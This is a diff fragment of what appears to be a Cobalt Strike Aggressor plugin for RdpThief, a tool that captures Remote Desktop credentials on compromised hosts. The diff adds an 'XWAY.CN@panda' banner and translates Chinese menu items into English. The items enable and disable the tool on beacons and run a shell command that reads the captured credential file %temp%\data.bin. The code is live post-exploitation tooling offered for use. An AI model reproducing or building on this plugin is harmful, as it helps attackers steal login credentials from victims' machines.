@@ -1,3 +1,12 @@
+##############################
+#                            #
+#                            #
+#                            #
+#       XWAY.CN@panda        #
+#                            #
+#                            #
+#                            #
+##############################
 @beacons = @();
 @pids = @();
 
@@ -32,17 +41,17 @@ sub handleProcess{
 }
 
     menu "RdpThief"{
-        item "开启Rdpthief"{
+        item "Open Rdpthief"{
             blog($1, "RdpThief enabled \n");
             add(@beacons,$1,0);
         }
 
-        item "关闭Rdpthief"{
+        item "Kill Rdpthief"{
             blog($1, "Disabling RdpThief");
             remove(@beacons,$1);
         }
 
-        item "提取Rdpthief记录"{
+        item "Extract Rdpthief log"{
             bshell($1,"type %temp%\\data.bin");
         }
     }
